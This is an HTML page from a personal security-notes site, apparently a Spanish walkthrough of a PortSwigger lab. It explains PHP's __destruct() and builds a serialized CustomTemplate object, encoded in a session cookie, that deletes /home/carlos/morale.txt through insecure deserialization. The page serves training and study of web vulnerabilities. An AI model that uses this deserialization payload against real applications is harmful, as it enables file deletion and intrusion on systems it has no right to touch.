@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;p&gt;Para leer el código fuente :&lt;/p&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <p>Para leer el código fuente :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /libs/CustomTemplate.php~
+</code></pre></div></div>
+
+<pre><code class="language-PHP">&lt;?php
+
+class CustomTemplate {
+    private $template_file_path;
+    private $lock_file_path;
+
+    public function __construct($template_file_path) {
+        $this-&gt;template_file_path = $template_file_path;
+        $this-&gt;lock_file_path = $template_file_path . ".lock";
+    }
+
+    private function isTemplateLocked() {
+        return file_exists($this-&gt;lock_file_path);
+    }
+
+    public function getTemplate() {
+        return file_get_contents($this-&gt;template_file_path);
+    }
+
+    public function saveTemplate($template) {
+        if (!isTemplateLocked()) {
+            if (file_put_contents($this-&gt;lock_file_path, "") === false) {
+                throw new Exception("Could not write to " . $this-&gt;lock_file_path);
+            }
+            if (file_put_contents($this-&gt;template_file_path, $template) === false) {
+                throw new Exception("Could not write to " . $this-&gt;template_file_path);
+            }
+        }
+    }
+
+    function __destruct() {
+        // Carlos thought this would be a good idea
+        if (file_exists($this-&gt;lock_file_path)) {
+            unlink($this-&gt;lock_file_path);
+        }
+    }
+}
+
+?&gt;
+</code></pre>
+
+<h3 id="-qué-es-__destruct-en-php">🛠 ¿Qué es <code class="language-plaintext highlighter-rouge">__destruct()</code> en PHP?</h3>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">__destruct()</code> es un <strong>método mágico</strong> de PHP.</p>
+  </li>
+  <li>
+    <p>Se llama <strong>automáticamente</strong> <strong>cuando un objeto se destruye</strong>.</p>
+  </li>
+</ul>
+
+<p>¿Y <strong>cuándo</strong> PHP destruye un objeto?</p>
+
+<ul>
+  <li>
+    <p>Cuando se termina el script.</p>
+  </li>
+  <li>
+    <p>Cuando haces <code class="language-plaintext highlighter-rouge">unset($obj)</code>.</p>
+  </li>
+  <li>
+    <p>Cuando el objeto <strong>ya no es referenciado por ninguna variable</strong> (recolector de basura).</p>
+  </li>
+</ul>
+
+<hr />
+
+<h3 id="-en-el-caso-de-deserialización">🔥 En el caso de <strong>deserialización</strong>:</h3>
+
+<p>Cuando haces:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$obj</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>PHP crea el objeto (<code class="language-plaintext highlighter-rouge">$obj</code>).</p>
+  </li>
+  <li>
+    <p>Si después el objeto <strong>sale de scope</strong>, <strong>o el script termina</strong>, o lo haces <code class="language-plaintext highlighter-rouge">unset($obj)</code>, entonces PHP llama <strong>automáticamente</strong> al método <code class="language-plaintext highlighter-rouge">__destruct()</code> <strong>del objeto</strong>.</p>
+  </li>
+</ul>
+
+<p><strong>NO necesitas llamarlo manualmente.</strong><br />
+<strong>NO necesitas hacer nada especial.</strong></p>
+
+<p>PHP <strong>garantiza</strong> que, cuando el objeto ya no es usado, ejecuta su <code class="language-plaintext highlighter-rouge">__destruct()</code>.</p>
+
+<hr />
+
+<p>Lo convertimos a base64 y luego url encode :</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">O</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="s2">"CustomTemplate"</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="s2">"lock_file_path"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">23</span><span class="o">:</span><span class="s2">"/home/carlos/morale.txt"</span><span class="p">;}</span>
+</code></pre></div></div>
+
+<p>Cuando pase el garbage collector se eliminará el archivo :</p>
+
+<pre><code class="language-HTTP">Cookie: session=TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ%3d%3d
+</code></pre>
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
